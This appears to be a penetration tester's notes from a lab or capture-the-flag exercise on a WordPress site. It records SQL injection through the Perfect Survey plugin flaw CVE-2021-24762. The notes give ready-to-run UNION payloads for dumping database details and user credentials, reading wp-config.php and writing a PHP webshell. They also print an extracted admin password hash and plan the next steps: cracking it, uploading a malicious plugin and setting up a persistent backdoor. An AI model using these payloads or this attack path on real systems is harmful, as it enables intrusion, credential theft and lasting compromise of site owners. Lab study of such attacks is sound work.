# Complete SQLi Data Extraction Summary

**Date:** 2025-09-30
**Target:** alvida-eatery.org (192.168.229.47)
**Method:** CVE-2021-24762 Perfect Survey UNION SQLi

---

## EXTRACTED DATA

### 1. SYSTEM INFORMATION

```
Database Name: wordpress
MySQL Version: 8.0.30-0ubuntu0.22.04.1
Database User: dbadmin@localhost
Operating System: Ubuntu 22.04
```

### 2. USER CREDENTIALS

```
Username: admin
Email: admin@offsec-lab.com
Password Hash: $P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0
Hash Type: WordPress phpass (bcrypt-based)
Total Users: 1 (only admin account exists)
```

### 3. DATABASE STRUCTURE (24 Tables)

**WordPress Core Tables:**
- `wp_users` - User accounts
- `wp_usermeta` - User metadata
- `wp_posts` - Posts/pages (75 total)
- `wp_postmeta` - Post metadata
- `wp_comments` - Comments
- `wp_commentmeta` - Comment metadata
- `wp_terms` - Taxonomy terms
- `wp_termmeta` - Term metadata
- `wp_term_taxonomy` - Term taxonomy
- `wp_term_relationships` - Term relationships
- `wp_links` - Links
- `wp_options` - WordPress settings

**Plugin Tables:**
- `wp_ps` - Perfect Survey main
- `wp_ps_answers` - Survey answers
- `wp_ps_answers_values` - Answer values
- `wp_ps_data` - Survey data
- `wp_ps_logic_conditions` - Survey logic
- `wp_ps_questions` - Survey questions

**Elementor Tables:**
- `wp_e_events` - Elementor events

**WPForms Tables:**
- `wp_wpforms_tasks_meta` - Form tasks

**Action Scheduler Tables:**
- `wp_actionscheduler_actions`
- `wp_actionscheduler_claims`
- `wp_actionscheduler_groups`
- `wp_actionscheduler_logs`

### 4. USEFUL EXTRACTION QUERIES

**Get Database Info:**
```sql
1 union select 1,1,char(116,101,120,116),database(),0,0,0,null,null,null,null,null,null,null,null,null from wp_users
1 union select 1,1,char(116,101,120,116),version(),0,0,0,null,null,null,null,null,null,null,null,null from wp_users
1 union select 1,1,char(116,101,120,116),user(),0,0,0,null,null,null,null,null,null,null,null,null from wp_users
```

**Get All Tables:**
```sql
1 union select 1,1,char(116,101,120,116),group_concat(table_name),0,0,0,null,null,null,null,null,null,null,null,null from information_schema.tables where table_schema=database()
```

**Get User Data:**
```sql
-- Username
1 union select 1,1,char(116,101,120,116),user_login,0,0,0,null,null,null,null,null,null,null,null,null from wp_users

-- Password Hash
1 union select 1,1,char(116,101,120,116),user_pass,0,0,0,null,null,null,null,null,null,null,null,null from wp_users

-- Email
1 union select 1,1,char(116,101,120,116),user_email,0,0,0,null,null,null,null,null,null,null,null,null from wp_users

-- All user data concatenated
1 union select 1,1,char(116,101,120,116),concat(user_login,':',user_email,':',user_pass),0,0,0,null,null,null,null,null,null,null,null,null from wp_users
```

**Count Records:**
```sql
1 union select 1,1,char(116,101,120,116),count(*),0,0,0,null,null,null,null,null,null,null,null,null from wp_users
1 union select 1,1,char(116,101,120,116),count(*),0,0,0,null,null,null,null,null,null,null,null,null from wp_posts
```

**Get Metadata Keys:**
```sql
1 union select 1,1,char(116,101,120,116),group_concat(meta_key),0,0,0,null,null,null,null,null,null,null,null,null from wp_usermeta
1 union select 1,1,char(116,101,120,116),group_concat(meta_key),0,0,0,null,null,null,null,null,null,null,null,null from wp_postmeta
```

---

## WHAT WAS NOT FOUND

❌ **No additional user accounts** - Only 1 admin user
❌ **No plaintext credentials** in wp_options or wp_postmeta
❌ **No backup files** in database
❌ **No API keys** in obvious locations
❌ **No SSH keys** stored in database

---

## ADDITIONAL EXTRACTION POSSIBILITIES

### File System Access (if FILE privilege exists)

**Check FILE privilege:**
```sql
1 union select 1,1,char(116,101,120,116),grantee,0,0,0,null,null,null,null,null,null,null,null,null from information_schema.user_privileges where privilege_type='FILE'
```

**Read wp-config.php:**
```sql
1 union select 1,1,char(116,101,120,116),load_file('/var/www/html/wp-config.php'),0,0,0,null,null,null,null,null,null,null,null,null from wp_users
```

**Write webshell:**
```sql
1 union select 1,1,char(116,101,120,116),'<?php system($_GET["cmd"]);?>',0,0,0,null,null,null,null,null,null,null,null,null into outfile '/var/www/html/shell.php' from wp_users
```

### MySQL User Hash Extraction (if privileges allow)

```sql
1 union select 1,1,char(116,101,120,116),concat(user,':',authentication_string),0,0,0,null,null,null,null,null,null,null,null,null from mysql.user
```

---

## EXPLOITATION IMPACT

### What We Have:
✅ Complete database access (read-only via SQLi)  
✅ Admin password hash for offline cracking  
✅ Database structure mapped  
✅ MySQL version identified (8.0.30)  
✅ Database user identified (dbadmin@localhost)  

### What We Need:
⏳ **Cracked admin password** - Currently running john/hashcat
🎯 **Admin login** - Once password cracked
🚀 **RCE via WordPress admin** - Upload malicious plugin/theme

### Attack Path:
1. ✅ SQLi → Extract hash
2. ⏳ Crack hash → Get password
3. 🎯 Login as admin → http://alvida-eatery.org/wp-admin/
4. 🚀 Upload malicious plugin → RCE
5. 🏴 Establish persistence → Backdoor

---

## NEXT STEPS

### Immediate:
1. **Continue hash cracking** with full rockyou.txt
2. **Try common WordPress passwords** if rockyou fails
3. **Research WordPress 6.0 authenticated exploits** as backup

### Post-Credential Access:
1. **Login to WordPress admin panel**
2. **Upload malicious plugin** for code execution
3. **Create backup admin account**
4. **Upload webshell** via theme editor
5. **Enumerate system** for privilege escalation
6. **Search for flags** in /var/www/, /home/, /root/

---

## LESSONS LEARNED

### SQLi Techniques:
1. **group_concat()** essential for extracting multiple rows
2. **information_schema** provides complete DB structure
3. **UNION column count** must match exactly (16 columns)
4. **char() encoding** bypasses some WAF filters
5. **Limit response size** - HTML truncates long responses

### Data Extraction Strategy:
1. Start with system info (database(), version(), user())
2. Map structure (tables, columns)
3. Extract credentials (users, passwords)
4. Check metadata (options, usermeta, postmeta)
5. Look for sensitive data (posts, comments)

### WordPress Security:
- Single admin account = single point of failure
- phpass hashes are slow to crack (8192 iterations)
- Database user 'dbadmin' suggests administrative access
- No additional authentication barriers beyond password

---

**Status:** Data extraction complete. Waiting on password crack.
**Next Action:** Monitor john/hashcat, prepare for admin login.
